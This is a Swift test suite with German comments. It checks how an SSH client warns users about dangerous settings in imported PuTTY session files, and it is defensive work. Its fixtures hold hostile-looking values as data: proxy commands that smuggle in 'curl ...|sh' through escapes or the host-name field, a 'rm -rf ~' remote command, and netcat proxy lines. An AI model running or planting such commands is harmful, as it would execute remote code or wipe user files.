import Foundation
import Testing
@testable import TunnelTerminalCore

/// Warnungen vor Import und Verbinden (Plan S4): Einstellungen, die mehr tun als verbinden.
@Suite("Warnungen")
struct SessionWarningTests {
    private func warnings(_ text: String) throws -> [SessionWarning] {
        try SessionFile(contents: Data(text.utf8)).warnings
    }

    @Test("Harmlose Sitzung: keine Warnung")
    func plainSession() throws {
        #expect(try warnings("HostName=server.example\nProxyMethod=0\nRemoteCommand=\nAgentFwd=0\nPortForwardings=\nLogType=0\n").isEmpty)
    }

    @Test("Lokaler Proxy-Befehl (ProxyMethod 5) zeigt den Befehl")
    func localProxyCommand() throws {
        let found: [SessionWarning] = try warnings("ProxyMethod=5\nProxyTelnetCommand=nc %proxyhost %proxyport\n")
        #expect(found == [.localProxyCommand("nc proxy 80")])   // eingesetzt wie von PuTTY (Standards „proxy“, 80)
        #expect(found[0].isDangerous)
    }

    @Test("Lokaler Proxy-Befehl ohne eigenen Befehl nutzt PuTTYs Standard")
    func localProxyDefaultCommand() throws {
        #expect(try warnings("ProxyMethod=5\nHostName=server.example\n") == [.localProxyCommand("connect server.example 22\n")])
    }

    @Test("Altes Format: ProxyType 4 ist ebenfalls ein lokaler Befehl, ProxyMethod hat Vorrang")
    func legacyProxyType() throws {
        #expect(try warnings("ProxyType=4\nProxyTelnetCommand=x\n") == [.localProxyCommand("x")])
        #expect(try warnings("ProxyMethod=2\nProxyType=4\n").isEmpty)
        #expect(try warnings("ProxyMethod=4\nProxyTelnetCommand=x\n").isEmpty)   // Telnet-Proxy: Befehl geht an den Proxy
    }

    @Test("Zahlen wie PuTTY (atoi): führende Ziffern zählen")
    func atoiLikeNumbers() throws {
        #expect(try warnings("ProxyMethod= 5x\nProxyTelnetCommand=y\n") == [.localProxyCommand("y")])
    }

    @Test("Zahlen exakt wie (int)strtol: lange Nullen, C-Leerraum, Überlauf auf 32 Bit", arguments: [
        "00000000005", "\u{0B}5", "\u{0C}\u{09}5", "4294967301", "+5", "-4294967291"
    ])
    func exactAtoi(_ method: String) throws {
        #expect(try warnings("ProxyMethod=\(method)\nProxyTelnetCommand=y\n") == [.localProxyCommand("y")])
    }

    @Test("Gesättigter Überlauf und Grenzwerte")
    func atoiOverflow() throws {
        func number(_ text: String) throws -> Int? { try SessionFile(contents: Data("N=\(text)\n".utf8)).integer(forKey: "N") }
        #expect(try number("99999999999999999999999") == -1)   // LONG_MAX → (int) -1
        #expect(try number("-99999999999999999999999") == 0)   // LONG_MIN → (int) 0
        #expect(try number("2147483648") == -2147483648)
        #expect(try number("x5") == 0)
        #expect(try number("") == 0)
        #expect(try SessionFile(contents: Data("AgentFwd=000000000001\n".utf8)).agentForwarding)
    }

    @Test("Altes ProxyType über 32-Bit-Überlauf ebenfalls erkannt")
    func legacyProxyTypeOverflow() throws {
        #expect(try warnings("ProxyType=4294967300\nProxyTelnetCommand=y\n") == [.localProxyCommand("y")])
    }

    @Test("Proxy-Befehl wird so angezeigt, wie plink ihn ausführt (Platzhalter und Escapes eingesetzt)")
    func proxyCommandExpansion() throws {
        let found: [SessionWarning] = try warnings("""
            ProxyMethod=5
            ProxyTelnetCommand=ssh %USER@%proxyhost:%proxyport nc %host %port\\x3b curl e|sh \\% 100%% %pass %x \\q
            ProxyUsername=a;b
            ProxyHost=j.example
            ProxyPort=2222
            ProxyPassword=geheim
            HostName=server.example
            Protocol=ssh
            PortNumber=2200

            """)
        #expect(found == [.localProxyCommand("ssh a;b@j.example:2222 nc server.example 2200; curl e|sh % 100% •••• %x \\q")])
        let hidden: [SessionWarning] = try warnings("ProxyMethod=5\nProxyTelnetCommand=nc %host\\n\nHostName=x;curl y|sh\n")
        #expect(hidden == [.localProxyCommand("nc x;curl y|sh\n")])
        #expect(hidden[0].message.hasSuffix("nc x;curl y|sh\\u{A}"))
    }

    @Test("Fest eingetragene Hostschlüssel: plink fragt nicht mehr nach – beim Import nicht vorausgewählt")
    func manualHostKeys() throws {
        let found: [SessionWarning] = try warnings("SSHManualHostKeys=SHA256:abc\n")
        #expect(found == [.manualHostKeys])
        #expect(found[0].blocksPreselection && !found[0].isDangerous)
    }

    @Test("Weitere Warnungen in fester Reihenfolge")
    func otherWarnings() throws {
        let found: [SessionWarning] = try warnings(
            "LogType=2\nLogFileName=/tmp/log\nPortForwardings=L8080=localhost:80\nAgentFwd=1\nRemoteCommand=rm -rf ~\n")
        #expect(found == [.remoteCommand("rm -rf ~"), .agentForwarding, .portForwardings("L8080=localhost:80"),
                          .sessionLog("/tmp/log")])
        #expect(found.allSatisfy { !$0.isDangerous })
        #expect(found.allSatisfy { !$0.message.isEmpty })
    }

    @Test("Eigene GSSAPI-Bibliothek: nur noch Hinweis – plink ist seit M3 ohne GSSAPI gebaut und lädt sie nicht")
    func customGSSLibrary() throws {
        let found: [SessionWarning] = try warnings("GSSCustom=/tmp/x.dylib\n")
        #expect(found == [.gssLibrary("/tmp/x.dylib")])
        #expect(!found[0].isDangerous)
        #expect(!found[0].blocksPreselection)
        #expect(found[0].message.contains("andere PuTTY"))
        #expect(try warnings("GSSCustom=\n").isEmpty)
    }

    @Test("Vorauswahl beim Import: nicht bei Gefährlichem und nicht, wenn eine Datei auf dem Mac geschrieben wird")
    func preselection() {
        #expect(SessionWarning.localProxyCommand("x").blocksPreselection)
        #expect(SessionWarning.sessionLog("x").blocksPreselection)
        #expect(!SessionWarning.sessionLog("x").isDangerous)
        #expect(!SessionWarning.remoteCommand("x").blocksPreselection)
        #expect(!SessionWarning.agentForwarding.blocksPreselection)
    }

    @Test("Steuer- und Richtungszeichen werden in Meldungen sichtbar gemacht (keine verdeckten Befehle)")
    func visibleControlCharacters() {
        #expect(SessionWarning.visible("rm\u{202E}fdp.txt") == "rm\\u{202E}fdp.txt")
        #expect(SessionWarning.visible("a\tb") == "a\\u{9}b")
        #expect(SessionWarning.visible("ä ö") == "ä ö")
        #expect(SessionWarning.localProxyCommand("x\u{202E}y").message.contains("x\\u{202E}y"))
    }

    @Test("SSH-Proxy über eine gespeicherte Sitzung: deren Gefahren zählen mit (PuTTY lädt sie, proxy/sshproxy.c)")
    func dangersViaProxySession() throws {
        let sessions: [String: String] = [
            "A": "ProxyMethod=6\nProxyHost=B\n",
            "B": "ProxyMethod=5\nProxyTelnetCommand=nc x\nGSSCustom=/tmp/g.dylib\n",
            "Schleife": "ProxyMethod=7\nProxyHost=Schleife\n",
            "Hostname": "ProxyMethod=8\nProxyHost=proxy.server.example\n",
            "Default Settings": "ProxyMethod=5\nProxyTelnetCommand=d\n"
        ]
        let load: (String) throws -> SessionFile? = { name in
            try sessions[name].map { try SessionFile(contents: Data($0.utf8)) }
        }
        let a: SessionFile = try #require(try load("A"))
        #expect(try SessionWarning.requiringConfirmation(for: a, load: load) == [
            .viaProxy("B", .localProxyCommand("nc x"))
        ])
        // Kein Sitzungsname: PuTTY nimmt die Standardeinstellungen und ersetzt nur den Server
        let hostname: SessionFile = try #require(try load("Hostname"))
        #expect(try SessionWarning.requiringConfirmation(for: hostname, load: load) == [
            .viaProxy("Default Settings", .localProxyCommand("d"))
        ])
        let loop: SessionFile = try #require(try load("Schleife"))
        #expect(try SessionWarning.requiringConfirmation(for: loop, load: load).isEmpty)
        #expect(SessionWarning.viaProxy("B", .localProxyCommand("x")).isDangerous)
        #expect(SessionWarning.viaProxy("B", .localProxyCommand("x")).message.contains("„B“"))
        // Nicht lesbare Proxy-Sitzung: Fehler statt stiller Freigabe
        #expect(throws: InputError.invalidFile) {
            try SessionWarning.requiringConfirmation(for: a) { _ in throw InputError.invalidFile }
        }
    }
}
